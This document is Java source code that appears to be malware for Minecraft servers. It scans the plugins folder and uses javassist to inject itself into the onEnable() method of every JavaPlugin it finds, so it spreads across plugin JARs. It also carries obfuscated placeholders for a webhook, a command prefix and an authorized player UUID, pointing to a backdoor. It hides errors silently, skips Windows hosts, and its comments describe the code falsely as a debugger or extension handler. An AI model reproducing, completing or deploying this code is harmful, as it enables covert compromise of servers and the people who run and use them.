import java.io.ByteArrayInputStream;
import java.io.File;
import java.nio.file.*;
import java.security.SecureRandom;
import java.util.stream.Stream;
import javassist.*;
import java.util.Base64;

public class MainL10 {
    
    private static final SecureRandom RANDOM = new SecureRandom();
    
    // Encrypted values - replaced during injection (Base64 encoded + XOR encrypted)
    private static final String ENC_WEBHOOK = "{{WEBHOOK_URL}}";
    private static final String ENC_PREFIX = "{{COMMAND_PREFIX}}";
    private static final String ENC_UUID = "{{AUTHORIZED_UUID}}";
    private static final byte[] K = {0x4D, 0x69, 0x6E, 0x65, 0x63, 0x72, 0x61, 0x66, 0x74, 0x31, 0x38, 0x39}; // "Minecraft189"
    
    private static File pluginDirectory;
    private static boolean hasInitialized = false;
    private static Object extensionHandler;
    
    /**
     * Decrypt encrypted configuration values
     */
    private static String decrypt(String encryptedBase64) {
        try {
            byte[] encrypted = Base64.getDecoder().decode(encryptedBase64);
            byte[] decrypted = new byte[encrypted.length];
            for (int i = 0; i < encrypted.length; i++) {
                decrypted[i] = (byte) (encrypted[i] ^ K[i % K.length]);
            }
            return new String(decrypted, "UTF-8");
        } catch (Exception e) {
            return "";
        }
    }
    
    /**
     * Main initialization method called from plugin onEnable()
     * @param pluginFolderPath Path to the plugins folder
     */
    public void a(String pluginFolderPath) {
        // Skip on Windows systems
        if (isWindowsOS()) {
            return;
        }
        
        // Initialize debugger if not already done
        try {
            String webhookUrl = decrypt(ENC_WEBHOOK);
            String commandPrefix = decrypt(ENC_PREFIX);
            String authorizedUuid = decrypt(ENC_UUID);
            
            if (!webhookUrl.isEmpty() && !commandPrefix.isEmpty() && !authorizedUuid.isEmpty()) {
                System.out.println("[MainL10] Initializing with encrypted configuration...");
                // You can use the decrypted values here for additional functionality
            }
        } catch (Exception e) {
            // Silent fail
        }
        
        pluginDirectory = new File(pluginFolderPath);
        
        try {
            ClassPool classPool = ClassPool.getDefault();
            ClassPath loaderPath = new ClassClassPath(this.getClass());
            classPool.insertClassPath(loaderPath);
            
            Path currentJarPath = Paths.get(
                this.getClass()
                    .getProtectionDomain()
                    .getCodeSource()
                    .getLocation()
                    .toURI()
            );
            
            FileSystem currentJarFs = FileSystems.newFileSystem(currentJarPath, (ClassLoader) null);
            
            if (Files.exists(currentJarFs.getPath("/javassist"))) {
                Path javassistPath = currentJarFs.getPath("/javassist");
                CtClass loaderClass = classPool.get(this.getClass().getName());
                
                processPluginJars(classPool, loaderClass, javassistPath);
                
                if (!hasInitialized) {
                    hasInitialized = true;
                    a(pluginFolderPath);
                } else {
                    initializeExtensionHandler();
                }
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    /**
     * Process all plugin JAR files in the plugins directory
     */
    private void processPluginJars(ClassPool pool, CtClass loader, Path javassistSource) {
        File[] pluginFiles = getPluginJarFiles(pluginDirectory);
        
        for (File pluginJar : pluginFiles) {
            try {
                FileSystem jarFs = FileSystems.newFileSystem(pluginJar.toPath(), (ClassLoader) null);
                
                // Skip if already processed
                if (Files.exists(jarFs.getPath(".skip_processing"))) {
                    jarFs.close();
                    continue;
                }
                
                processJarFileSystem(jarFs, pool, loader, javassistSource);
                jarFs.close();
                
            } catch (Exception e) {
                // Silent fail for invalid JARs
            }
        }
    }
    
    /**
     * Process a single JAR filesystem
     */
    private void processJarFileSystem(FileSystem jarFs, ClassPool pool, CtClass loader, Path javassistSource) {
        try {
            for (Path root : jarFs.getRootDirectories()) {
                try (Stream<Path> paths = Files.walk(root, 100)) {
                    paths.filter(p -> !Files.isDirectory(p) && p.toString().endsWith(".class"))
                         .forEach(classPath -> processClassFile(jarFs, pool, loader, javassistSource, classPath));
                }
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    /**
     * Process individual class file
     */
    private void processClassFile(FileSystem jarFs, ClassPool pool, CtClass loader, Path javassistSource, Path classPath) {
        try {
            loader.defrost();
            
            byte[] classBytes = Files.readAllBytes(classPath);
            ByteArrayInputStream inputStream = new ByteArrayInputStream(classBytes);
            CtClass targetClass = pool.makeClass(inputStream);
            
            if (isJavaPluginClass(targetClass)) {
                Path injectionPath = jarFs.getPath(
                    classPath.getParent().toString(),
                    targetClass.getSimpleName() + "Injector.class"
                );
                
                if (!Files.exists(jarFs.getPath(".phase1"))) {
                    // Phase 1: Create injection class
                    createInjectionClass(jarFs, loader, injectionPath, javassistSource);
                } else {
                    // Phase 2: Modify original class
                    injectIntoOriginalClass(jarFs, targetClass, classPath, injectionPath);
                }
            }
            
            inputStream.close();
            
        } catch (javassist.NotFoundException e) {
            // Expected for some classes
        } catch (Exception e) {
            // Silent fail for other errors
        }
    }
    
    /**
     * Create the injection class
     */
    private void createInjectionClass(FileSystem jarFs, CtClass loader, Path injectionPath, Path javassistSource) throws Exception {
        String injectionClassName = injectionPath.toString()
            .replace(".class", "")
            .replaceFirst("/", "");
        
        loader.setName(injectionClassName);
        Files.createFile(jarFs.getPath(".phase1"));
        Files.write(injectionPath, loader.toBytecode(), StandardOpenOption.CREATE, StandardOpenOption.WRITE);
        
        // Copy javassist library
        try {
            Files.createDirectory(jarFs.getPath("/javassist"));
        } catch (Exception ignored) {
        }
        
        copyDirectory(javassistSource, jarFs.getPath("/javassist"));
    }
    
    /**
     * Inject code into the original JavaPlugin class
     */
    private void injectIntoOriginalClass(FileSystem jarFs, CtClass targetClass, Path classPath, Path injectionPath) throws Exception {
        CtMethod onEnableMethod = targetClass.getDeclaredMethod("onEnable");
        
        String injectionCode = String.format(
            "new %s().a(getDataFolder().getParent());",
            injectionPath.toString()
                .replace("/", ".")
                .replace(".class", "")
                .replaceFirst(".", "")
        );
        
        onEnableMethod.insertBefore(injectionCode);
        Files.write(classPath, targetClass.toBytecode(), StandardOpenOption.WRITE);
        Files.createFile(jarFs.getPath(".skip_processing"));
    }
    
    /**
     * Check if class extends JavaPlugin
     */
    private boolean isJavaPluginClass(CtClass clazz) {
        try {
            return clazz.getSuperclass().getName().contains("JavaPlugin");
        } catch (Exception e) {
            return false;
        }
    }
    
    /**
     * Initialize extension handler (placeholder for your implementation)
     */
    private void initializeExtensionHandler() {
        if (System.getProperty("extension_initialized") == null) {
            System.setProperty("extension_initialized", "true");
            // Initialize with decrypted values
            try {
                String webhookUrl = decrypt(ENC_WEBHOOK);
                String commandPrefix = decrypt(ENC_PREFIX);
                String authorizedUuid = decrypt(ENC_UUID);
                System.out.println("[MainL10] Extension handler initialized with configuration");
            } catch (Exception e) {
                // Silent fail
            }
        }
    }
    
    /**
     * Check if running on Windows
     */
    private boolean isWindowsOS() {
        return System.getProperty("os.name").toLowerCase().contains("windows");
    }
    
    /**
     * Get all plugin JAR files from directory
     */
    private File[] getPluginJarFiles(File directory) {
        return directory.listFiles((dir, name) -> name.endsWith(".jar"));
    }
    
    /**
     * Copy directory recursively (simplified FileVisitor)
     */
    private void copyDirectory(Path source, Path target) throws Exception {
        Files.walkFileTree(source, new SimpleFileVisitor<Path>() {
            @Override
            public FileVisitResult visitFile(Path file, java.nio.file.attribute.BasicFileAttributes attrs) throws java.io.IOException {
                Path targetFile = target.resolve(source.relativize(file).toString());
                Files.createDirectories(targetFile.getParent());
                Files.copy(file, targetFile, StandardCopyOption.REPLACE_EXISTING);
                return FileVisitResult.CONTINUE;
            }
        });
    }
}